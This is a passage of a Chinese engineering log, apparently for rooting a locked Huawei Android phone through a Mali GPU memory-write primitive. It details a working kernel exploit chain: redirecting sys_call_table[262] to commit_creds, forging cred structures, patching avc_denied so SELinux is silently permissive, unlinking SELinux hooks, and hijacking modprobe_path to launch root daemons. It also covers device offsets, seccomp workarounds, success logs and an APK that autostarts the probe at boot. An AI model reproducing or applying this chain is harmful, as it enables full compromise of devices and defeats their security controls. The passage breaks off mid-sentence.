1. `mark()` 在提权前打开一次 `jit_write.log` 并**缓存 fd**，之后复用（fd 在子进程中继承），彻底绕开空 keyring 的路径查找。
2. 触发前预打开 `phaseg.ok`，提权后用该 fd 写 `1` 作为成功标记。
3. 提权后不再依赖 fork/exec 用户文件：用第三个 2MB 块通道（L2 槽 502）把 `modprobe_path` 改写成 `/data/local/tmp/mp`，再用未注册的 socket family（43..30，如 AF_NFC=39）触发 `request_module` → `call_modprobe`，由内核以 v10 已验证的方式拉起 rootd.sh/rootsrv。
4. 探针随后 `connect(127.0.0.1:45679)` 自检守护通道；`probe/run_v15.sh` 仍是一键驱动（900 s 门控、残留检测、md5、FBE 预建、日志镜像、`r 'id'` 校验）。

**v15 真机结果（2026-11-03 20:44，md5 `dff49a69cacdd8be127ba569a20f59a5`）**：

- 同一链路再次走到 `phaseF: trigger enforce, uid=2000`，随后探针进程变 `Uid: 0 / CapEff 0000007fffffffff / u:r:kernel:s0`，但**提权后的任何写操作都没有出现在日志里**：`probe.out` 与 `jit_write.log` 停止增长，`phaseg.ok` 仍为 0 字节，两个由 `start_root_channel()` fork 的子进程成为 zombie，`modprobe_path` 的槽 502 写入与 socket 触发也没有产生 `mp.out`。文本补丁同样**没有被恢复**。
- 用独立单进程验证补丁仍然活着：`probe/enfread.c` 绑定 cpu0、读取 `/sys/fs/selinux/enforce`，之后 `getuid()==0`（退出码 7）。即 **新进程也能通过该文本补丁完成 `commit_creds(init_cred)`**，与 v14 的结论一致。
- 读取若干次后设备自行重启，`ro.boot.bootreason=abnormal`（非 kernel_panic），怀疑与 HKIP/完整性组件对"活着的 text patch"的反应有关，未定论。
- ~~**未解释的边界**~~（**已定论，见 C-14**）：v11 的同类提权可以正常写日志和启动 daemon，是因为 v11 原地改 cred 字段、`security` 指针未动，SID 仍是 `shell`；而 v14/v15/v16a 走 `commit_creds(init_cred)` 会把 SID 换成 `u:r:kernel:s0`，该域对 `shell_data_file` **零条 allow 规则**，于是提权后所有 VFS 操作被 `avc_denied()` 拒绝，且因 `dontaudit` 而无 avc 日志。与 ENOKEY / HKIP 无关。
- 结论：**文本补丁执行路线可用，但目前只适合做一次性提权证明；持久 root 通道仍以 v11（纯数据 syscall 262）为可靠方案。**

**v14 一键脚本已改为外部判定**：`run_v14.sh` 不再依赖提权后的日志/`r`，而是在镜像循环里直接读 `/proc`（非 FBE），发现 `ps -A -o USER,NAME` 中探针用户变为 `root` 即停并打印 `TEXT-PATCH ROOT OK`，同时输出 `/proc/<pid>/status` 的 `Uid/Gid/CapEff` 与 `attr/current`。两次连续真机运行均判定成功（`probe/archive-v14/v14_textroot_evidence.txt`）。

**当前状态**：问题 2（文本补丁是否落地并执行）已得到肯定答案并在两次运行中复现；问题 4 的一键脚本 `run_v14.sh` 已可用外部指标验收。设备当前保留着活的 v14 补丁与 dirty L2 探针（不要 kill，重启即清）。

### C-12. v16：克隆 cred 提权（保留 keyring，解决"新文件 ENOKEY"）

**动机**：v11 的 `commit_creds(init_cred)` 把整个 cred 对象换掉，FBE 会话 keyring 一并变成 init 的空 keyring → 提权后无法在 `/data` 新建文件（只能写已存在文件），这是"能用"上的硬伤。v16 仍调用 `commit_creds`，但传给它的是**我们自己构造的克隆**：init_cred 的完整拷贝（uid 0、全 capability、kernel SID）+ 我们自己 cred 里的 keyring 指针。

**为什么不在原 cred 上原地改**：`fork` 会给 `cred->usage` 递增，该字段与 uid/gid/cap_effective 同处 0x00–0x3f 一条 64B cacheline（脏行）。用 GPU 写物理内存 + `dc ivac` 失效缓存会丢弃这条脏行里的引用计数，导致 cred 被提前释放。克隆放在 CPU 可写的 Mali 保留页里，与线性映射读写一致，内核读到的就是我们写进去的字节，且不需要任何缓存维护。

**结构体偏移（★ 权威来源改为"静态结构体本身"，反汇编只用来交叉验证）**：

| 项 | 偏移 | 怎么确认的 |
|---|---|---|
| `task_struct->tasks` | 0x670 | `show_state_filter.cfi` 的 `ldr x23,[init_task,#0x670]`；运行时再用"第一个 task 的 `->prev` 必须等于 `&init_task.tasks`"强校验 |
| `task_struct->real_cred` / `->cred` | 0x930 / 0x938 | 在 `kimage.bin` 的 `init_task` 里扫"等于 `init_cred` 地址的 qword"，正好命中 0x930/0x938 两个 |
| `task_struct->comm` | **0x940** | 在 `init_task` 里扫可打印字符串，只有 `swapper/0` 一处，位于 0x940；`cred` 紧跟其后（4.14 字段顺序 `real_cred, cred, comm`） |
| `cred->uid/gid/…/fsgid` | 0x04…0x20 | `init_cred` 区 8 个 u32 全为 0 |
| `cred->cap_permitted` / `cap_effective` / `cap_bset` | 0x30 / 0x38 / 0x40 | `init_cred` 三处都是 `0x7fffffffff` |
| `cred->jit_keyring` + 4 个 keyring 指针 | 0x50…0x77 | `init_cred` 区全为 0（init 没有 keyring），与 `put_cred_rcu` 的结构一致 |
| `cred->security` / `user` / `user_ns` / `group_info` | 0x78 / 0x80 / 0x88 / 0x90 | 0x90 的值正好等于 `init_groups` 符号地址 |

**踩坑（重要）**：`comm` 最初被写成 **0xa08**，来源是 `__set_task_comm.cfi` 里一条 `add x22,x0,#0xa08`。实际跑起来 629 个 task 的 comm 全是
`dead4ead00010001…`——那是华为在 task_struct 里放的一片 `0xdead4ead` 调试数组，说明 offset 错了。
根因是 KCFI 跳转表跟随有时会落到相邻的另一个函数体上，**单凭一次反汇编不足以定论**。
现在改为两条独立证据：① 静态 `init_task` 里 `swapper/0` 字面量位置；② 运行时空值校验
（读到的 `init_task.comm` 不是 `swapper/0` 就立刻放弃，不再盲走）。这个自检现在每次 dry 都跑。

**线性映射基址校准（实测数据）**：
- 两次不同开机：`memstart_addr=0xffffffc400000000` → `lm_base=0xfffffffc00000000`（即 memstart = -4 GB）；
  另一次 `0xffffffed00000000` → `lm_base=0xffffffd300000000`（-0x1d GB）。每次开机都不一样。
- 校准公式 `lm_base = 0xffffffc000000000 - memstart_addr`（s64 负数参与 u64 模运算），
  再用"第一个 task 的 `->prev == &init_task.tasks`"确认；不符则按 1 GB 步长向下扫描（`ARM64_MEMSTART_ALIGN`）。
- 注意 `kimage_voffset`（镜像 VA−PA）与线性映射偏移是**两个不同的量**，不能互相替代：
  镜像走 kimage 映射，堆/栈/task_struct 走线性映射。

**注意**：kallsyms 里的 `commit_creds` / `sys_getuid` 等是华为 KCFI 跳转表标签（一串 `b` 指令），真正的函数体在 `.cfi` 符号处，必须先跟一跳。`dis_sym.py` 直接反汇编会得到一张跳转表。但**跟一跳也不保证落在对的函数上**（见上面 comm 0xa08 的教训）——结构体偏移最终一定要用静态结构体内容或运行时强校验来确认。

**★ 地址布局的关键发现（此前所有版本都没意识到）**：线性映射并不在 `PAGE_OFFSET` 上，物理地址不能简单用 `VA - PAGE_OFFSET` 算。

- `arch/arm64/include/asm/memory.h`：VA_BITS=39 → `PAGE_OFFSET = 0xffffffc000000000`，`KIMAGE_VADDR = 0xffffff8800000000`（本机 `_text` 实测 0xffffff89e2680000，落在 MODULES_VADDR 之后，符合"镜像不在线性区"）。
- `arch/arm64/mm/init.c:660-679`：KASLR 打开时 `memstart_addr -= ARM64_MEMSTART_ALIGN * ((range * memstart_offset_seed) >> 16)`，即**整个线性区被随机上移**（seed 来自 kaslr.c:129 的 `seed >> 48`）。因此 `PA = VA - (PAGE_OFFSET - memstart_addr) + 0`，那个 `(PAGE_OFFSET - memstart_addr)` 才是真正的基址。
- 实测（dry run）：`init_task.tasks.next = 0xffffffd76974c770`。若按 `PAGE_OFFSET` 直算会得到 100 GB 的物理地址——第一个 v16 dry run 就在这里判定校准失败并安全退出（未 panic）。
- 实测（两次不同开机）：`memstart_addr=0xffffffc400000000` → `lm_base=0xfffffffc00000000`（memstart = −4 GB）；
  另一次 `0xffffffed00000000` → `lm_base=0xffffffd300000000`（−0x1d GB）。**每次开机都不同**，必须运行时读取。
- 校准公式 `lm_base = 0xffffffc000000000 - memstart_addr`（s64 负数参与 u64 模运算），再用"第一个 task 的 `->prev` 必须等于 `&init_task.tasks`"这条强校验确认；不符则按 1 GB 步长向下扫描（`ARM64_MEMSTART_ALIGN` = 1 GB）。
- 注意 `kimage_voffset`（镜像 VA−PA）与线性映射偏移是**两个不同的量**，不能互相替代：镜像走 kimage 映射，堆/栈/task_struct 走线性映射。所以"用 `rt_text - img_base` 当线性基址"是错的。
- 该发现同时解释了为什么 phase E 只能用 `img_base + off`（镜像走 kimage 映射），而任何**堆/栈指针**都必须先经过线性映射基址换算——此前没人需要做这个换算，因为 payload 全是镜像内的符号。

**探针流程（phase I，`probe/jit_write_probe_v16.c`）**：
1. 读 `init_task` 页 → 取 `tasks.next/prev`；读 `memstart_addr` 定出 `lm_base` 并校验。
2. 从链表尾（最新任务）往回走，按 `comm`（`/proc/self/comm`，15 字节）匹配到自己 → 取 `cred` 指针 → 物理读回 cred 页，**校验 `cred->uid == getuid()`（2000）**，不一致立即放弃。
3. 读 `init_cred` 页 → 拷贝 0x100 字节到缓冲 → `usage=1` → 把我们的 `0x50..0x77`（jit_keyring + 四个 keyring 指针）覆盖进去。
4. 目标页 = `cand[v0] + t*PAGE`（phase C 已验证过的保留页），`fake_pa = pt[t]`；先做**往返校验**（CPU 写 magic → 物理读回比对），确认 VA↔PA 关系。
5. 通过 L2 block descriptor（slot 500）把 `sys_call_table[262]` 指向 `commit_creds`，读回校验后 `syscall(262, fake_va)`，随后立即恢复表项。
6. 验收：`getuid()==0`；追加写已存在文件；**新建 `/data/local/tmp/v16_newfile`**（区分 ENOKEY=keyring 仍丢 / EACCES=SELinux 拦截）；读 `/proc/self/attr/current`；启动 rootd + rootsrv。
7. 结束置 `g_dirty_l2=1` 进入 keepalive（L2 里有 foreign descriptor，退出会 panic）。

**dry 模式**：`/data/local/tmp/v16_go` 不存在时只做到第 5 步之前，把上述所有校验结果写进日志后退出。`sh probe/run_v16.sh dry|go` 一键驱动（门控 900 s、md5、预建 FBE 文件、2 s 粒度日志镜像）。

**踩坑记录**：第一次一键运行在启动后约 20 s 内 kernel_panic 重启，且推送的文件被 ext4 回滚（新文件消失、`koffs.txt` 回到旧内容、`probe.out` 变回上一轮日志）——**panic 后 /data 里未提交的写入会丢**。此后脚本改为：推送后 `sync`、日志文件先 `touch` 再截断（不 rm），并把镜像间隔从 20 s 压到 2 s，保证 panic 前的日志能落到主机。

### C-13. Android 打包：开机自启动 + 可手动开关（`android/`）

**为什么必须做成 APK**：内核恐慌后 root 进程不会自己回来；BL 锁定的机器又不能加 init 服务。
Android 上"重启后无需 root 就能被系统拉起"的唯一入口是 `BOOT_COMPLETED`，也就是一个普通应用。

**三道开关**（用户要求"必须可手动关闭，否则恐慌后一直自启就得格式化手机"）：
1. 应用内开关 / 常驻通知的 `Disable autostart`；
2. `/sdcard/HLK_ROOT_OFF`（或应用外部私有目录下的 `DISABLE`）——UI 打不开、进不了桌面都能用，`adb shell touch` 即可；
3. **两振出局**：启动探针前落盘 `attempt=1`，探针报 root 后清除；下次开机发现标记还在就记一次 strike，
   连续 2 次自动关闭自启动。这是防止"恐慌→重启→再恐慌"死循环的刹车。

**"Disable" 不杀进程**：探针写过 GPU 页表后，进程退出会拆掉 kbase 上下文触发 panic，
所以关闭的只是"下次还自启"，当前这次活到重启为止。这点在应用里写明。

**关键技术点（都是实测踩出来的）**：
- 原生探针以 `lib/arm64-v8a/libxprobe.so` 打包，安装器才会解压到 `/data/app/<pkg>/lib/arm64/`；
  服务再把它复制到 `code_cache` 并 `chmod +x` 后执行。
- **targetSdk 必须是 28**：Android 10 只对 targetSdk ≥ 29 禁止执行自身目录下的文件。
  实测通过时 logcat 里有 `avc: granted { execute_no_trans } … scontext=u:r:untrusted_app_27`；
  写成 29 会变成 `denied`，整个方案不成立。
- 无 gradle 构建：`aapt2 link` → `javac`（需 build-tools 的 `core-lambda-stubs.jar`，因为 android.jar 是 stub，没有 `LambdaMetafactory`）→ `d8` → 打 zip → `zipalign` → `apksigner`。
- 从 adb 发广播控制开关时**必须**加 `-f 0x01000000`（`FLAG_RECEIVER_INCLUDE_BACKGROUND`），否则应用在后台会被 `Background execution not allowed` 丢掉（实测）。
- 日志由服务逐行读探针 stdout 并 **每行 fsync**：恐慌会回滚 /data 上未提交的写入（C-12 踩过），缓冲区里的日志等于没有。
- **EMUI 安装必须亮屏解锁**：否则 `adb install` / `pm install` 直接返回
  `INSTALL_FAILED_ABORTED: User rejected permissions`（安装确认框被系统在息屏时自我拒绝）。
  `android/install.sh` 会唤醒、解锁、并在出现"继续安装"时自动点两下（华为要点两次）。

**当前状态（2026-11-03）**：构建/安装/开机自启/三道开关/两振逻辑全部就位；
探针在应用进程里 exec 成功（selftest 输出 `uid=10014 … symbols=15`）；
待 v16a 真机验证通过后把 root 通道接进来（服务已把 `rootd.sh`/`rootsrv`/`r` 作为 assets 解出，
并通过 `PROBE_CHANNEL_DIR` 传给探针，探针拿到 root 后自己往 `/data/local/tmp` 复制）。

### C-14. 【定论】"提权后 I/O 不可见"= kernel SID，不是 ENOKEY（2026-11-04）

C-11 留下过一条未解释的边界：v14/v15 里进程明明已是 `Uid: 0 / u:r:kernel:s0`，
但提权之后所有 `open()`/`write()`（日志、marker、exec、Mali 写）**全部静默消失**。
当时怀疑过 FBE 会话 keyring 丢失（ENOKEY）、也怀疑过 "HKIP 静默限制"。**两个都错了。**

真正的机制，一句话：**`u:r:kernel:s0` 对 `shell_data_file` 一条 allow 规则都没有。**

```
$ grep -c '(allow kernel shell_data_file' sepolicy/*.ci
0
$ grep  '(allow shell  shell_data_file' sepolicy/plat_sepolicy.ci
(allow shell shell_data_file (dir (ioctl read write create getattr setattr lock rename add_name remove_name reparent search rmdir open)))
(allow shell shell_data_file (file (ioctl read write create getattr setattr lock append map unlink rename open)))
```

`commit_creds(init_cred)` 的副作用不只是 uid/caps——**`cred->security` 也被一起换成了
init 的 SID**，于是进程从 `shell` 域跳进 `kernel` 域，之后每一次
`security_file_permission()` 都在 `avc_denied()` 处以 `-EACCES` 返回。

为什么这个现象那么难查（三个"隐身"叠加）：

1. **`mark()` 忽略 `write()` 返回值**，`fsync()` 又不走 `file_permission`，所以看起来"写成功了"。
2. **华为策略对该组合 `dontaudit`**，`logcat | grep avc: denied` 里一条都没有
   （唯一能看到的是 `granted` 事件和 shell 自己读 dmesg 被拒）。
3. **进程没死也没崩**：`phaseI_done` 会把 `g_dirty_l2=1` 然后进
   `for(;;) sleep(3600)` 的 keepalive，于是 `ps` 里是一个安静的 `S` 状态 root 进程，
   `wchan=0`、`schedstat` 两次采样完全一致——看着像"卡死在 commit_creds 里"。
   两个 zombie 子进程则是 `start_root_channel()` 里两次 `exec` 被拒后 `_exit(127)`。

**这同时解释了 v11 为什么"能正常写日志"**：v11 是在原 cred 上原地改写 uid/caps，
`security` 指针没动，SID 仍是 `shell`，所以 I/O 一切正常。差异从来不在"提权发生在哪条路径"。

**取证手法（不依赖 root）**：`wc -c probe.out jit_write.log` 两者字节数完全相同
→ 说明最后一行两处都进去了；`/proc/<pid>/stat` 第 3 字段 `S` + 第 35 字段 `wchan=0`
+ `schedstat` 不再增长 → 真睡眠而非空转；`ps` 里僵尸子进程的 `comm` 仍是
`[jit_write_probe]`（exec 失败的特征）而非 `sh`/`rootsrv` → 反推 `start_root_channel()` 跑过。

**修复（v16b）**：克隆 cred 时把 `security`（偏移 **0x78**）也一起从自己的 cred 拷过来，
即 `C_KEY_LEN` 由 `0x28` 改成 `0x30`。uid 0 + caps + **原 SID**，I/O 全部恢复。
根因既然在 `avc_denied`，就有更彻底的做法规避 SID 问题：

```c
/* security/selinux/avc.c:999 —— 全局唯一的 denial 闸门 */
static noinline int avc_denied(u32 ssid, u32 tsid, u16 tclass, u32 requested,
			       u8 driver, u8 xperm, unsigned flags,
			       struct av_decision *avd)
{
	if (flags & AVC_STRICT)                                     return -EACCES;
	if (selinux_enforcing && !(avd->flags & AVD_FLAGS_PERMISSIVE)) return -EACCES;
	avc_update_node(AVC_CALLBACK_GRANT, ...);                   return 0;
}
```

`CONFIG_SECURITY_SELINUX_DEVELOP` 未设置，`selinux_enforcing` 被编译成常量，
**没有可写的开关**；但把它整个替换成 `mov w0,#0 ; ret`（`0xd65f03c052800000`）就是全局 permissive。
写入走 GPU → 必须随后 `flush_icache_range`（该 build 只发 `ic ivau`，
D-clean 被 `ARM64_HAS_CACHE_IDC` patch 掉，所以对只读 text 合法；
`__inval_dcache_area` 的 `dc ivac` 会因需要写权限而 oops）。

### C-15. 日志旁路：提权后不再依赖文件系统

即使 SID 对了，"提权后日志突然断掉"这个坑会反复出现。v16b 起加了一条旁路：
**在 main 很早就 `fork()` 一个 relay 子进程**（那时 `fork` 不会扰动 JIT/UAF 窗口），
它 keeps 启动时的 cred，只做一件事——把管道内容搬进 `probe.out` 与 `jit_write.log`。
提权前把 `g_rep_on=1`，之后所有 `mark()` 都只往管道写。管道不需要 SELinux 文件权限、
也不需要 FBE 密钥，所以**任何 cred/SID 变更都不会再让日志消失**。

### C-16. 重启时的 panic：两个候选，以及"不要 kill root 进程"

现象：探针在 keepalive 里活着时重启手机，下一次 boot 的 `sys.boot.reason` 会是
`kernel_panic,fatal_exception`（`ro.boot.bootreason=abnormal`）。**手机会正常起来**，
只是这一次重启被记为异常。v16b（`usage=0x1000` 已修）重启后该字段依旧如此，
所以**下面两个候选都还在，尚未定论**：

**候选 1：非 slab 的 cred 被 `kmem_cache_free`。** 克隆 cred 住在 Mali 保留页里，
不是 `cred_jar` 的对象。若 `usage` 被 `exit_creds()` 的两次 `put_cred()` 减到 0，
`__put_cred()` → `call_rcu(put_cred_rcu)` → `kmem_cache_free(cred_jar, 我们的页)`
→ `cache_from_obj()` 读 `page->slab_cache`（Mali 页，无意义字节）→ 解引用垃圾指针
→ fatal exception，`PANIC_ON_OOPS=y` 直接 panic。
**这个 bug 是确定存在的**（v16a 的 `usage=1` 必然触发），所以 v16c 起改成 `0x1000`，
代价是泄漏一份 cred。但它显然不是本次 panic 的唯一原因。

**候选 2（更可能是主因）：脏的 GPU L2 描述符在 mali 上下文销毁时被回收。**
`chan_map_block()` 把 L2 槽 500/501 改成指向我们挑的 2MB 物理块
（`PTE_FLAGS_BLOCK`），`g_dirty_l2=1` 就是"这些描述符没还原"的标记。
进程退出 → mali 释放 context → `kbase_mmu_teardown_pgd` 按自己的记账去 unmap/free，
撞上我们改过的描述符就会 free 掉不相干的物理页 → 崩溃。
**没有安全的方式还原**：需要先读回原始描述符才知道写什么，而 500/501 原本是否为
有效描述符未验证，盲写 0 同样可能弄坏驱动。所以维持现状：
**只在重启时才炸，运行期间稳定**（v16b 实跑 ~10 分钟无异常）。

**设计含义**：root 进程必须按"设计上永不退出"对待。`run_v16.sh` 里
`g_dirty_l2` 的 `for(;;) sleep(3600)` keepalive 不只是"保住 L2 描述符"，
它也是**唯一安全的终态**。APK 的 killSwitch 因此绝不能 kill 探针进程，
只能做到"不再重启它"。同时也意味着：**每次跑完再重启，这次重启都会被记成异常，
属预期现象，不是新故障。**

### C-17. `MALI_WRITE_VALUE` 的对齐约束（0x58 的真正含义）

phaseJ 第一次写 `avc_denied` 时用的是 64 位写，结果：

```
[3.27] phaseJ: avc_denied off=0x6b866c pa=0x73866c va=0xffffff8e31f3866c
[3.30] write atom 174: event code=0x58 atom=174
```

`0x58` 在 `mali_base_kernel.h` 里是 **`BASE_JD_EVENT_DATA_INVALID_FAULT`**。
根因不是地址没映射，而是**对齐**：`off_avc = 0x6b866c` 在 2MB 块内的偏移
`0x13866c` 只有 4 字节对齐，而 `MALI_WRITE_VALUE_TYPE_IMMEDIATE_64`
要求 8 字节对齐，否则整个 atom 以 `DATA_INVALID_FAULT` 失败、**目标地址一个字节都不会写**。

规则（实测）：

| 类型 | 常量 | 值 | 对齐要求 |
|---|---|---|---|
| `IMMEDIATE_8` | `4u` | 1 | 1 |
| `IMMEDIATE_32` | `6u` | 1 | 4 |
| `IMMEDIATE_64` | `7u` | 1 | **8** |

所以改一条内核指令（4 字节）用 `gpu_write32` 就够；要写两条必须拆成
两次 32 位写，不能合成一次 64 位写。另外因为 `DATA_INVALID_FAULT` 对
"没映射"和"没对齐"是同一个码，写 text 前应先做一次**预检**：把该 2MB 槽
指向自己的保留页、在未使用的偏移（0x180）写一个标记再用物理读回校验，
确认窗口可达之后再去碰 text。

### C-18. 【定论】v16e 全链路成功：三个坑，一条链（2026-11-04）

v16e 是第一个「root 真正可用」的版本，md5 `36d6b858e9f5f376290a94cfa6d97fea`。
它和 v16c 只差三处，但每一处都是必修的：

**坑 1：phaseJ 之后槽 500 的映射是脏的。**
phaseJ 为了写 text 调了两次 `chan_map_block(501)`，这会让槽 500（`sys_call_table`）
的 GPU 侧映射/TLB 失效。如果紧接着复用第一次建立的槽 500 窗口去写 `entry262`，
写操作会"成功返回"但物理读回仍是旧值（还是 `flush_icache_range`）。
**修法：写 `entry262` 之前重新 `chan_map_block(500)`。**

**坑 2：这里读回不一致其实不该 abort。**
因为那时槽 262 里躺着的是 `flush_icache_range`，而
`flush_icache_range(fake_va, 0)` 是空操作（`cmp x4,x1; b.lo` 不成立，直接返回），
所以 `syscall(262, fake_va, 0)` 完全安全。
**修法：重试 3 次，仍不一致就不 abort，直接调用 `syscall(262, fake_va, 0)`，
用 `getuid()` 当最终裁判。** 这一条把"读回假阴性"从致命变成无害。

**坑 3：写 flush 钩子后必须先校验再调用。**
如果槽 501 的映射是陈旧的，`syscall(262, ...)` 会把 text 地址当 cred 交给
`commit_creds()` → 立刻 panic。**修法：`hook_ok` 物理读回校验通过后才
`syscall(262, pg, pg+PAGE)`。**（这条是 v16c 第一版的真实事故，已修）

成功日志四连：

```
[3.28] phaseJ: slot501 preflight wr=0 map_ok=1
[3.35] phaseJ: patched ok, flushed 8 cpus, icache 0xffffff81b1738000
[3.38] phaseI: try0 wr=0 entry262=ffffff81b2a30da8 want=ffffff81b2a30da8 ok
[3.38] phaseI: create new file = 7 errno=0 (ok)
[5.38] PHASE_I OK uid=0 caps=7fffffffff avc=1 sid=kernel(init_cred)
```

**持久性（这是本轮最意外的收获）**：提权后 18 分钟复采，四项能力全通——

| 检查 | 结果 |
|---|---|
| 探针进程 | pid 5976 `S` 状态存活，relay 5977 存活 |
| `id` | `uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0` |
| `ls /data/data` | 可列出 `android` `androidhwext` `com.android.bluetooth` … |
| `head /proc/kallsyms` | 可读 |
| 新建文件 | `-rw-rw-rw- 1 root root 14 /data/local/tmp/v16_durable` |
| `cat /sys/fs/selinux/enforce` | 仍是 `1` |

`enforce` 仍显示 1 是**故意留着**的：`avc_denied()` 被替换成 `mov w0,#0; ret` 后，
这个 sysfs 文件读的是策略里的 enforcing 标志，那个标志我们没动。
所有 denial 在 `avc_denied()` 这一层就被短路成 0，所以**界面 Enforcing、行为已 permissive**。
这样做的额外好处是不去动 `selinux_state`，减少一处可能被完整性检查发现的面。

所以 v16e 不再是「5 秒窗口」，也不是「受限 root」——它是一个可以长期挂着、
能读能写能 exec 的 uid 0 内核域进程。至此 A（稳定化）与 B（可用化）都到位，
剩下的只有 C（开机自启 + 手动开关）。

### C-19. 【定论】应用域硬墙：seccomp 按「号码」过滤，钩子槽位必须现场求交集（2026-11-04）

APK 路径第一次完整跑到 phaseJ 就被杀：

```
[ 1530.30] hooks: seccomp blocked every ni slot, defaulting to 262
[    2.25] phaseF: hook slot=262 (index 1 of 1 candidates)
[    2.42] phaseJ: slot501 preflight wr=0 map_ok=1
probe exited rc=159 (no root)          <- 128+31 = SIGSYS
```

`rc=159` 是 `SIGSYS`，不是 `ENOSYS`。Android 给每个应用都挂 seccomp filter，
**没列出的号码不是返回 ENOSYS，而是直接被 `SECCOMP_RET_TRAP` 打死**。而整条链
必须从 EL0 *调用* 两个内核函数（`flush_icache_range`、`commit_creds`），唯一办法
就是把 `sys_call_table` 的某个槽指过去再调它——号码本身过不了 filter，槽位选得
再对也没用。

**两个集合都不能假设，必须分别测量：**

| 集合 | 怎么得到 |
|---|---|
| callable | fork 一个一次性子进程，`syscall(n,0,0,0,0,0)`；被 SIGSYS 杀 = 不在白名单（实测应用域 `206/400`，`244..263` **一个都不在**） |
| ni | 读活体 `sys_call_table`，逐项与 `sys_ni_syscall` 比较（配置项裁掉的门也在这里） |

**离线也能算 ni 集合**，不必上机：`kimage.bin` 里 `sys_call_table` 的文件偏移是
`0x1b92000`（见 `koffs.txt`），把 292 项按 64 位小端解出来，与
`sys_ni_syscall` 的运行期地址比：

```python
img.seek(0x1b92000); vals = struct.unpack('<512Q', img.read(4096))
ni = [i for i in range(292) if vals[i] == 0xffffff8578e65c74]
```

编号已用符号表交叉验证（56=`SyS_openat`、63=`SyS_read`、64=`SyS_write`、
174=`sys_getuid`、220=`SyS_clone`、221=`SyS_execve`、98=`SyS_futex`、
167=`SyS_prctl`），结果：

```
42, 89, 104, 180-197, 235-239, 244-259, 262-265, 272, 282, 288-290
```

对应含义：42=`nfsservctl`（早已删除）、89=`acct`（`CONFIG_BSD_PROCESS_ACCT` 未开）、
104=`kexec_load`（`CONFIG_KEXEC` 未开）、**180-197 整段**（`CONFIG_POSIX_MQUEUE`
未开 + `kexec_file_load` + 预留洞）、235-239（NUMA，`CONFIG_NUMA` 未开）、
244-259（arm64 空洞）、262/263（`CONFIG_FANOTIFY` 未开）、264/265、272、
282（`userfaultfd`）、288-290（`pkey_*`，arm64 无 MPK）。

**这就是旧扫描的盲区**：只扫 244..263，而这个区间恰好全在应用白名单之外；
180-197、235-239、282、288-290 这些同样是死槽，号码却可能落在白名单里。
所以 v16 改成「callable ∩ ni」，两边都现场测。

**但实测结论是交集为空。** 把白名单完整抓下来（改成每 16 个一行才没被截断）后：

```
seccomp allowed: 0-17,19-38,41,43-50,52-59,60-88,90-98,101-103,107-111,
                 113-115,117-141,147,148,150,153-158,160,163-169,172-179,
                 198-201,203-216,220-223,226-233,240-243,260,261,
                 267-271,274-279,281,283-287
```

对照 ni 集合 `{42,89,104,180-197,235-239,244-259,262-265,272,282,288-290}`，
**一个都不在**：42 前后是 41/43，89 前后是 88/90，180-197 前后是 179/198，
235-239 前后是 233/240，244-265 前后是 243/267，272 前后是 271/274，
282 前后是 281/283，288-290 在 287 之后全无。

也就是说 Android 的 app allowlist 正好是「bionic 真正用到的号码」，
而所有 ni 洞都是**没人用的号码**——两件事天然互斥。所以：

> **应用域不可能劫持任何 ni 槽位。** 这条路封死，不是工程问题，是集合不相交。

顺带把 `pick_hook_candidates()` 改成两趟：**先 244..263 升序**（保住 v16e 在
adb 路径上已经证明可用的选择，行为不变），再扫全表其余部分。`sc_allowed()`
的 poll 超时也从 300ms 收到 150ms，超时就 `kill` 并**有界地 waitpid 回收**
那个一次性子进程——第一版用 `WNOHANG` 抢在 SIGKILL 生效前返回，留下一个
`Z< [jit_write_probe]` 僵尸挂在探针下面（`hooks: 291 of 292` 少的就是它）。

（`seccomp_scan()` 的输出也改成每 16 个一行：第一次跑应用域时，那条 2400 字节的
长单行在主机侧按字节偏移镜像时被截断，白名单尾部 57 个号码直接丢了。）

### C-20. v17：绕过 seccomp 的另一条路——纯数据写 + usermodehelper（2026-11-04）

C-19 的结论逼出一个方向：**不要调用内核函数**。整条链其实只需要两处写：

| 目标 | 性质 | 作用 |
|---|---|---|
| `security_hook_heads` | `.data` 里的 `list_head` 数组 | 把 SELinux 的节点从每个 hook 链表里摘掉 → 所有 SELinux 检查直接不存在 |
| `modprobe_path` | `.data` 里的 256 字节字符串 | 指向我们自己的脚本 |
| 未知 magic 的 exec | 用户态系统调用 | 内核 `request_module()` → `call_usermodehelper()` 起一个**内核线程**执行 `modprobe_path`，该线程不带任何 seccomp filter |

第三点是关键：`call_usermodehelper` 的进程来自 kthreadd/workqueue，**不继承调用者的
seccomp**，所以这条路天然穿过应用域那堵墙，也不需要劫持 `sys_call_table`、
不需要改 text、不需要 i-cache 刷新。

**为什么是「逐个摘节点」而不是「把表头指向自己」**：把 `list_head` 指向自己确实
一步就能清空，但那会把 `capability` 的节点一起摘掉（capable() 全部放行），更要命的是
**半残的 SELinux 比全开的 SELinux 危险**——alloc 类 hook 停了、permission 类 hook 还在，
后者会去解引用前者本该填好的 security blob，直接空指针 panic。所以只能精确摘：
节点地址落在 `selinux_hooks[]` 区间内的才摘，capability 的节点留着。

地址（本机，`_text` 相对偏移，已进 `koffs.txt` 与内置表）：

```
security_hook_heads 1b805d8    # 185 个 list_head，到 selinux_enabled(1b81168) 为止
capability_hooks    1b80308    # 22 个节点
selinux_hooks       1b81170    # 到 ss_initialized(1b82cf0)，0x1b80 字节 = 220 个 32 字节节点
modprobe_path       2bb6058
```

摘链的写是 `prv->next = nxt` / `nxt->prev = prv`，两个目标地址都在同一个 2MB 块里，
所以一次 `chan_map_block` 窗口就够。计划先在用户态按快照算好，再平铺成一串
8 字节 store；写完必须**回读再算一遍**，剩下的 SELinux 节点数必须是 0，
否则就是半残状态，得当作失败处理。

前置条件已核对：`CONFIG_MODULES=y`、`CONFIG_STATIC_USERMODEHELPER` **未开**
（否则 `modprobe_path` 会被编译期固定）、`CONFIG_SECURITY_SELINUX_DEVELOP` 未开
（所以没有 enforcing 开关可写，只能走 hook 链表），`/data` 挂载带 `nosuid,nodev`
但**没有 noexec**，所以脚本可以放在 `/data/local/tmp`（adb）或应用私有目录（APK）。

还有一个坑：`request_module()` 对 binfmt 是**同步**的（`UMH_WAIT_PROC`），
它会一直等到 helper **退出**才返回。所以 helper 脚本必须把守护进程放到后台再
`exit 0`，否则触发 exec 的那个子进程会永远卡在 `execve()` 里。

### C-21. v17 实测：摘链要迭代，helper 假说逐个排除（2026-11-04 夜）

**一、多节点链摘不干净，必须迭代。** 第 4 轮日志里出现了一次 `176 nodes over 185
